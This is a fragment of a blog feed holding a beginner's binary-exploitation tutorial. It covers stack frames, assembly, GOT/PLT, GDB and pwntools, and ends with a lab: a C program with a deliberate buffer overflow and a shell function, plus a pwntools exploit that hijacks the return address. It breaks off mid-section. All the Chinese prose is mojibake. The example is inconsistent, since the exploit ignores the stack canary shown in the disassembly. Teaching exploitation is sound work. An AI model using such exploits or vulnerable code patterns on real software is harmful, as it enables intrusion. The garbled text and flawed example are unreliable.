            <tag> BUUOJ </tag>
            
            <tag> V&amp;Næ‹›æ–°å…¬å¼€èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€çŸ¥è¯†</title>
      <link href="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-æ ˆå¸§çš„æ¦‚å¿µ"><a href="#0x-01-æ ˆå¸§çš„æ¦‚å¿µ" class="headerlink" title="0x 01 æ ˆå¸§çš„æ¦‚å¿µ"></a>0x 01 æ ˆå¸§çš„æ¦‚å¿µ</h3><blockquote><p>ä»é€»è¾‘ä¸Šè®²ï¼Œæ ˆå¸§å°±æ˜¯ä¸€ä¸ªå‡½æ•°æ‰§è¡Œçš„ç¯å¢ƒï¼šå‡½æ•°è°ƒç”¨æ¡†æ¶ã€å‡½æ•°å‚æ•°ã€å‡½æ•°çš„å±€éƒ¨å˜é‡ã€å‡½æ•°æ‰§è¡Œå®Œåè¿”å›åˆ°å“ªé‡Œç­‰ç­‰ã€‚æ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€å»¶ä¼¸çš„ã€‚æ¯ä¸ªå‡½æ•°çš„æ¯æ¬¡è°ƒç”¨ï¼Œéƒ½æœ‰å®ƒè‡ªå·±ç‹¬ç«‹çš„ä¸€ä¸ªæ ˆå¸§ï¼Œè¿™ä¸ªæ ˆå¸§ä¸­ç»´æŒç€æ‰€éœ€è¦çš„å„ç§ä¿¡æ¯ã€‚</p><p>å¯„å­˜å™¨ebpæŒ‡å‘å½“å‰çš„æ ˆå¸§çš„åº•éƒ¨ï¼ˆé«˜åœ°å€ï¼‰ï¼Œå¯„å­˜å™¨espæŒ‡å‘å½“å‰çš„æ ˆå¸§çš„é¡¶éƒ¨ï¼ˆä½åœ°å€ï¼‰ã€‚</p></blockquote><p><img src="https://images2015.cnblogs.com/blog/1069650/201704/1069650-20170427115241365-545987088.png" alt="img"></p><p>æ³¨æ„ï¼šebpæŒ‡å‘å½“å‰ä½äºç³»ç»Ÿæ ˆæœ€ä¸Šè¾¹ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿæ ˆçš„åº•éƒ¨ã€‚ä¸¥æ ¼è¯´æ¥ï¼Œâ€œæ ˆå¸§åº•éƒ¨â€å’Œâ€œæ ˆåº•â€æ˜¯ä¸åŒçš„æ¦‚å¿µ;ESPæ‰€æŒ‡çš„æ ˆå¸§é¡¶éƒ¨å’Œç³»ç»Ÿæ ˆçš„é¡¶éƒ¨æ˜¯åŒä¸€ä¸ªä½ç½®ã€‚**</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/33debug/p/6773059.html" target="_blank" rel="noopener">å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼ˆæ ˆå¸§ï¼‰</a></p><h3 id="0x-02-ç›¸å…³æ±‡ç¼–æŒ‡ä»¤"><a href="#0x-02-ç›¸å…³æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="0x 02 ç›¸å…³æ±‡ç¼–æŒ‡ä»¤"></a>0x 02 ç›¸å…³æ±‡ç¼–æŒ‡ä»¤</h3><p>å…³äºdword ptr æŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword   åŒå­— å°±æ˜¯å››ä¸ªå­—èŠ‚</span><br><span class="line">ptr     pointerç¼©å†™ å³æŒ‡é’ˆ</span><br><span class="line">[]é‡Œçš„æ•°æ®æ˜¯ä¸€ä¸ªåœ°å€å€¼ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘ä¸€ä¸ªåŒå­—å‹æ•°æ®</span><br><span class="line">æ¯”å¦‚mov eax, dword ptr [12345678]  æŠŠå†…å­˜åœ°å€12345678ä¸­çš„åŒå­—å‹ï¼ˆ32ä½ï¼‰æ•°æ®èµ‹ç»™eax</span><br></pre></td></tr></table></figure><p>å…³äºCALLï¼ŒRETå’ŒLEAVEæŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CALLæŒ‡ä»¤çš„æ­¥éª¤ï¼šé¦–å…ˆæ˜¯å°†è¿”å›åœ°å€ï¼ˆä¹Ÿå°±æ˜¯callæŒ‡ä»¤è¦æ‰§è¡Œæ—¶EIPçš„å€¼ï¼‰å‹å…¥æ ˆé¡¶ï¼Œç„¶åæ˜¯å°†ç¨‹åºè·³è½¬åˆ°å½“å‰è°ƒç”¨çš„æ–¹æ³•çš„èµ·å§‹åœ°å€ã€‚æ‰§è¡Œpushå’ŒjumpæŒ‡ä»¤ã€‚</span><br><span class="line"></span><br><span class="line">RETæŒ‡ä»¤åˆ™æ˜¯å°†æ ˆé¡¶çš„è¿”å›åœ°å€å¼¹å‡ºåˆ°EIPï¼Œç„¶åæŒ‰ç…§EIPæ­¤æ—¶æŒ‡ç¤ºçš„æŒ‡ä»¤åœ°å€ç»§ç»­æ‰§è¡Œç¨‹åºã€‚</span><br><span class="line"></span><br><span class="line">LEAVEæŒ‡ä»¤æ˜¯å°†æ ˆæŒ‡é’ˆæŒ‡å‘å¸§æŒ‡é’ˆï¼Œç„¶åPOPå¤‡ä»½çš„åŸå¸§æŒ‡é’ˆåˆ°%EBPã€‚ï¼ˆæ¢å¤åˆ°è°ƒç”¨çš„æ—¶å€™ebpå’Œespå€¼ï¼‰</span><br><span class="line"></span><br><span class="line">Leaveç­‰ä»·äºï¼š</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>push   ebp //å‹å…¥è¿”å›åœ°å€</p><p>leaæŒ‡ä»¤ å¤åˆ¶å†…å­˜åœ°å€</p><h3 id="0x-03-ç›¸å…³å¯„å­˜å™¨"><a href="#0x-03-ç›¸å…³å¯„å­˜å™¨" class="headerlink" title="0x 03 ç›¸å…³å¯„å­˜å™¨"></a>0x 03 ç›¸å…³å¯„å­˜å™¨</h3><p>eipå¯„å­˜å™¨ï¼šç”¨æ¥å­˜å‚¨CPUè¦è¯»å–æŒ‡ä»¤çš„åœ°å€,CPUé€šè¿‡<em>EIPå¯„å­˜å™¨</em>è¯»å–å³å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</p><h3 id="0x-04-GOTè¡¨å’ŒPLTè¡¨"><a href="#0x-04-GOTè¡¨å’ŒPLTè¡¨" class="headerlink" title="0x 04 GOTè¡¨å’ŒPLTè¡¨"></a>0x 04 GOTè¡¨å’ŒPLTè¡¨</h3><p>ä¸ºäº†æ›´å¥½çš„ç”¨æˆ·ä½“éªŒå’Œå†…å­˜<em>C*</em>P<strong>U<em>çš„åˆ©ç”¨ç‡ï¼Œç¨‹åºç¼–è¯‘æ—¶ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œä¸€ä¸ªä¸º</em>P</strong>L<strong>T<em>è¡¨ï¼Œä¸€ä¸ªä¸º</em>G</strong>O<strong>T<em>è¡¨ï¼Œ</em>P</strong>L<strong>T<em>è¡¨å¯ä»¥ç§°ä¸ºå†…éƒ¨å‡½æ•°è¡¨ï¼Œ</em>G</strong>O<strong>T<em>è¡¨ä¸ºå…¨å±€å‡½æ•°è¡¨ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯åŠ¨æ€å‡½æ•°è¡¨è¿™æ˜¯ä¸ªäººè‡ªç§°ï¼‰ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ç›¸å¯¹åº”çš„ï¼Œä»€ä¹ˆå«åšç›¸å¯¹åº”å‘¢ï¼Œ</em>P</strong>L<strong>T<em>è¡¨ä¸­çš„æ•°æ®å°±æ˜¯</em>G</strong>O*<em>T</em>è¡¨ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€å®šæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://img-blog.csdn.net/20170123151558845?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTg2NjEyNTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></p><h3 id="0x-05-64ä½æ±‡ç¼–å‚æ•°ä¼ é€’"><a href="#0x-05-64ä½æ±‡ç¼–å‚æ•°ä¼ é€’" class="headerlink" title="0x 05 64ä½æ±‡ç¼–å‚æ•°ä¼ é€’"></a>0x 05 64ä½æ±‡ç¼–å‚æ•°ä¼ é€’</h3><p><img src="https://bbs.pediy.com/upload/attach/201902/827130_P7PCJ24ZK3TVPMA.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œ å‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡ä» â€œå³å‘å·¦â€ æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ ·ã€‚</span><br><span class="line"></span><br><span class="line">å‚æ•°ä¸ªæ•°å¤§äº 7 ä¸ªçš„æ—¶å€™</span><br><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">h-&gt;8(%esp)</span><br><span class="line">g-&gt;(%esp)</span><br><span class="line">call H</span><br><span class="line"></span><br><span class="line">writeå‡½æ•°éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œéœ€è¦rdiï¼Œrsiï¼Œrdxä¸‰ä¸ªå¯„å­˜å™¨</span><br><span class="line">http:&#x2F;&#x2F;abcdxyzk.github.io&#x2F;blog&#x2F;2012&#x2F;11&#x2F;23&#x2F;assembly-args&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x-06-å†…å­˜å¯¹é½"><a href="#0x-06-å†…å­˜å¯¹é½" class="headerlink" title="0x 06 å†…å­˜å¯¹é½"></a>0x 06 å†…å­˜å¯¹é½</h3><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200119204051236.png" alt="image-20200119204051236"></p><ul><li>ä½œç”¨ï¼šå‡å°‘CPUè®¿é—®å†…å­˜çš„æ¬¡æ•°</li><li>åŸå› ï¼š</li></ul><p>1.å¹³å°åŸå› (ç§»æ¤åŸå› )ï¼šä¸æ˜¯æ‰€æœ‰çš„ç¡¬ä»¶å¹³å°éƒ½èƒ½è®¿é—®ä»»æ„åœ°å€ä¸Šçš„ä»»æ„æ•°æ®çš„ï¼›æŸäº›ç¡¬ä»¶å¹³å°åªèƒ½åœ¨æŸäº›åœ°å€å¤„å–æŸäº›ç‰¹å®šç±»å‹çš„æ•°æ®ï¼Œå¦åˆ™æŠ›å‡ºç¡¬ä»¶å¼‚å¸¸ã€‚<br>2.æ€§èƒ½åŸå› ï¼šæ•°æ®ç»“æ„(å°¤å…¶æ˜¯æ ˆ)åº”è¯¥å°½å¯èƒ½åœ°åœ¨è‡ªç„¶è¾¹ç•Œä¸Šå¯¹é½ã€‚åŸå› åœ¨äºï¼Œä¸ºäº†è®¿é—®æœªå¯¹é½çš„å†…å­˜ï¼Œå¤„ç†å™¨éœ€è¦ä½œä¸¤æ¬¡å†…å­˜è®¿é—®ï¼›è€Œå¯¹é½çš„å†…å­˜è®¿é—®ä»…éœ€è¦ä¸€æ¬¡è®¿é—®ã€‚<br>å‚è€ƒèµ„æ–™ï¼š <a href="https://mp.weixin.qq.com/s?src=11&timestamp=1579437525&ver=2106&signature=nR5axh9kvfbbOyiJz7Xog*tdwlSkaLY5ecX7Rztxmt3AeBlxmpC2vgKCji6l6OBEoiKvO9K8Pscd27wxWv0oMZYrdmMCWYDIf6qsc*g2QAQ*n-XZqB*bgtAw2SKh28zs&new=1" target="_blank" rel="noopener">ã€åº•å±‚åŸç†ã€‘C/C++å†…å­˜å¯¹é½è¯¦è§£</a>       </p><h3 id="0x-07-GDBè°ƒè¯•å‘½ä»¤"><a href="#0x-07-GDBè°ƒè¯•å‘½ä»¤" class="headerlink" title="0x 07 GDBè°ƒè¯•å‘½ä»¤"></a>0x 07 GDBè°ƒè¯•å‘½ä»¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆgdbï¼‰helpï¼šæŸ¥çœ‹å‘½ä»¤å¸®åŠ©ï¼Œå…·ä½“å‘½ä»¤æŸ¥è¯¢åœ¨gdbä¸­è¾“å…¥help + å‘½ä»¤,ç®€å†™h</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰runï¼šé‡æ–°å¼€å§‹è¿è¡Œæ–‡ä»¶ï¼ˆrun-textï¼šåŠ è½½æ–‡æœ¬æ–‡ä»¶ï¼Œrun-binï¼šåŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰,ç®€å†™r</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰startï¼šå•æ­¥æ‰§è¡Œï¼Œè¿è¡Œç¨‹åºï¼Œåœåœ¨ç¬¬ä¸€æ‰§è¡Œè¯­å¥</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰listï¼šæŸ¥çœ‹åŸä»£ç ï¼ˆlist-n,ä»ç¬¬nè¡Œå¼€å§‹æŸ¥çœ‹ä»£ç ã€‚list+ å‡½æ•°åï¼šæŸ¥çœ‹å…·ä½“å‡½æ•°ï¼‰,ç®€å†™l</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰setï¼šè®¾ç½®å˜é‡çš„å€¼</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰nextï¼šå•æ­¥è°ƒè¯•ï¼ˆé€è¿‡ç¨‹ï¼Œå‡½æ•°ç›´æ¥æ‰§è¡Œï¼‰,ç®€å†™n</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰stepï¼šå•æ­¥è°ƒè¯•ï¼ˆé€è¯­å¥ï¼šè·³å…¥è‡ªå®šä¹‰å‡½æ•°å†…éƒ¨æ‰§è¡Œï¼‰,ç®€å†™s</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰backtraceï¼šæŸ¥çœ‹å‡½æ•°çš„è°ƒç”¨çš„æ ˆå¸§å’Œå±‚çº§å…³ç³»,ç®€å†™bt</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰frameï¼šåˆ‡æ¢å‡½æ•°çš„æ ˆå¸§,ç®€å†™f</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰infoï¼šæŸ¥çœ‹å‡½æ•°å†…éƒ¨å±€éƒ¨å˜é‡çš„æ•°å€¼,ç®€å†™i</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰finishï¼šç»“æŸå½“å‰å‡½æ•°ï¼Œè¿”å›åˆ°å‡½æ•°è°ƒç”¨ç‚¹</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰continueï¼šç»§ç»­è¿è¡Œ,ç®€å†™c</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰printï¼šæ‰“å°å€¼åŠåœ°å€,ç®€å†™p</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰quitï¼šé€€å‡ºgdb,ç®€å†™q</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰break+numï¼šåœ¨ç¬¬numè¡Œè®¾ç½®æ–­ç‚¹,ç®€å†™b</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰info breakpointsï¼šæŸ¥çœ‹å½“å‰è®¾ç½®çš„æ‰€æœ‰æ–­ç‚¹</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰delete breakpoints numï¼šåˆ é™¤ç¬¬numä¸ªæ–­ç‚¹,ç®€å†™d</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰displayï¼šè¿½è¸ªæŸ¥çœ‹å…·ä½“å˜é‡å€¼</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰undisplayï¼šå–æ¶ˆè¿½è¸ªè§‚å¯Ÿå˜é‡</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰watchï¼šè¢«è®¾ç½®è§‚å¯Ÿç‚¹çš„å˜é‡å‘ç”Ÿä¿®æ”¹æ—¶ï¼Œæ‰“å°æ˜¾ç¤º</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰i watchï¼šæ˜¾ç¤ºè§‚å¯Ÿç‚¹</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰enable breakpointsï¼šå¯ç”¨æ–­ç‚¹</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰disable breakpointsï¼šç¦ç”¨æ–­ç‚¹</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰xï¼šæŸ¥çœ‹æŒ‡å®šå†…å­˜åœ°å€å†…å®¹  x&#x2F;20xw æ˜¾ç¤º20ä¸ªå•å…ƒï¼Œ16è¿›åˆ¶ï¼Œ4å­—èŠ‚æ¯å•å…ƒ</span><br><span class="line"> https:&#x2F;&#x2F;www.cnblogs.com&#x2F;redman274&#x2F;p&#x2F;12164753.html</span><br><span class="line"> å¦‚æœåœ°å€æ‰€æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯sï¼Œå¦‚æœåœ°å€æ˜¯æŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯i</span><br><span class="line"> </span><br><span class="line">ï¼ˆgdbï¼‰run argv[1] argv[2]ï¼šè°ƒè¯•æ—¶å‘½ä»¤è¡Œä¼ å‚</span><br><span class="line"></span><br><span class="line">ï¼ˆgdbï¼‰set follow-fork-mode child#Makefileé¡¹ç›®ç®¡ç†ï¼šé€‰æ‹©è·Ÿè¸ªçˆ¶å­è¿›ç¨‹ï¼ˆfork()ï¼‰</span><br><span class="line"></span><br><span class="line">gdb ä¸­step next ä¸finishçš„åŒºåˆ«</span><br><span class="line">step å°±æ˜¯å•æ­¥æ‰§è¡Œï¼Œé‡åˆ°å­å‡½æ•°å°±è¿›å…¥å¹¶ä¸”ç»§ç»­å•æ­¥æ‰§è¡Œï¼›åœ¨å…¶ä»–è°ƒè¯•å…¶ä¸­ç›¸å½“äºstep-intoå‘½ä»¤ï¼Œä½œç”¨æ˜¯ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå¯æ‰§è¡Œçš„ä»£ç è¡Œã€‚å¦‚æœå½“å‰è¡Œæ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œåˆ™è°ƒè¯•å™¨è¿›å…¥å‡½æ•°å¹¶åœæ­¢åœ¨å‡½æ•°ä½“çš„ç¬¬ä¸€è¡Œã€‚stepå¯ä»¥å¸®åŠ©åˆæ­¥æ­å¼€ä»£ç ä½ç½®çš„è°œå›¢ï¼Œä¾‹å¦‚ï¼šå‡½æ•°è°ƒç”¨å’Œå‡½æ•°æœ¬èº«å¯èƒ½åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">next æ˜¯åœ¨å•æ­¥æ‰§è¡Œæ—¶ï¼Œåœ¨å‡½æ•°å†…é‡åˆ°å­å‡½æ•°æ—¶ä¸ä¼šè¿›å…¥å­å‡½æ•°å†…å•æ­¥æ‰§è¡Œï¼Œè€Œæ˜¯å°†å­å‡½æ•°æ•´ä¸ªæ‰§è¡Œå®Œå†åœæ­¢ï¼Œä¹Ÿå°±æ˜¯æŠŠå­å‡½æ•°æ•´ä¸ªä½œä¸ºä¸€æ­¥ã€‚åœ¨å…¶ä»–è°ƒè¯•å™¨ä¸­ç›¸å½“äºstep-overï¼Œä½œç”¨æ˜¯åœ¨åŒä¸€ä¸ªè°ƒç”¨æ ˆå±‚ä¸­ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå¯æ‰§è¡Œçš„ä»£ç è¡Œã€‚è°ƒè¯•å™¨ä¸ä¼šè¿›å…¥å‡½æ•°ä½“ã€‚å¦‚æœå½“å‰è¡Œæ˜¯å‡½æ•°çš„æœ€åä¸€è¡Œï¼Œåˆ™ï¼Œnextå°†è¿›å…¥ä¸‹ä¸€ä¸ªæ ˆå±‚ï¼Œå¹¶åœ¨è°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€è¡Œåœæ­¢ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">finishå°±æ˜¯ä½†å•æ­¥æ‰§è¡Œåˆ°å­å‡½æ•°å†…æ—¶ï¼Œç”¨step outå°±å¯ä»¥æ‰§è¡Œå®Œå­å‡½æ•°ä½™ä¸‹éƒ¨åˆ†ï¼Œå¹¶è¿”å›åˆ°ä¸Šä¸€å±‚å‡½æ•°ã€‚åœ¨å…¶ä»–è°ƒè¯•å™¨ä¸­ç›¸å½“äºstep-outï¼Œä½œç”¨æ˜¯åœ¨æ ˆä¸­å‰è¿›åˆ°åˆ°ä¸‹ä¸€å±‚ï¼Œå¹¶åœ¨è°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€è¡Œåœæ­¢ã€‚</span><br></pre></td></tr></table></figure><h3 id="0x-08-cyclicå·¥å…·"><a href="#0x-08-cyclicå·¥å…·" class="headerlink" title="0x 08 cyclicå·¥å…·"></a>0x 08 cyclicå·¥å…·</h3><p>ä½¿ç”¨pwntoolsé‡Œé¢çš„cyclicå·¥å…·ç”Ÿæˆå­—ç¬¦ä¸²å’Œè®¡ç®—åç§»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;æ¡Œé¢&#x2F;PWN# cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;æ¡Œé¢&#x2F;PWN# cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure><h3 id="0x-09-ç®€å•å®ä¾‹"><a href="#0x-09-ç®€å•å®ä¾‹" class="headerlink" title="0x 09 ç®€å•å®ä¾‹"></a>0x 09 ç®€å•å®ä¾‹</h3><p>æºä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>funcå‡½æ•°æ±‡ç¼–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func:</span><br><span class="line">   0x080484b4 &lt;+0&gt;:push   ebp</span><br><span class="line">   0x080484b5 &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x080484b7 &lt;+3&gt;:sub    esp,0x38</span><br><span class="line">   0x080484ba &lt;+6&gt;:mov    eax,gs:0x14</span><br><span class="line">   0x080484c0 &lt;+12&gt;:mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x080484c3 &lt;+15&gt;:xor    eax,eax</span><br><span class="line">   0x080484c5 &lt;+17&gt;:sub    esp,0x4</span><br><span class="line">   0x080484c8 &lt;+20&gt;:push   0x50   &#x2F;&#x2F;å‹å…¥readå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°</span><br><span class="line">   0x080484ca &lt;+22&gt;:lea    eax,[ebp-0x2c]   </span><br><span class="line">   0x080484cd &lt;+25&gt;:push   eax    &#x2F;&#x2F;å‹å…¥readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°</span><br><span class="line">   0x080484ce &lt;+26&gt;:push   0x0    &#x2F;&#x2F;å‹å…¥readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°</span><br><span class="line">   0x080484d0 &lt;+28&gt;:call   0x8048350 &lt;read@plt&gt;    &#x2F;&#x2F;è°ƒç”¨pltè¡¨çš„</span><br><span class="line">   0x080484d5 &lt;+33&gt;:add    esp,0x10</span><br><span class="line">   0x080484d8 &lt;+36&gt;:nop</span><br><span class="line">   0x080484d9 &lt;+37&gt;:mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080484dc &lt;+40&gt;:xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x080484e3 &lt;+47&gt;:je     0x80484ea &lt;func+54&gt;</span><br><span class="line">   0x080484e5 &lt;+49&gt;:call   0x8048360 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x080484ea &lt;+54&gt;:leave  </span><br><span class="line">   0x080484eb &lt;+55&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;pwn1&quot;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 0x2c + 0x4</span><br><span class="line">payload &#x3D; &#39;a&#39;*offset + p32(0x0804849b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å®ä¾‹äºŒï¼š</p><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200117223344225.png" alt></p><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200117223446581.png" alt></p><p>æ±‡ç¼–ä»£ç 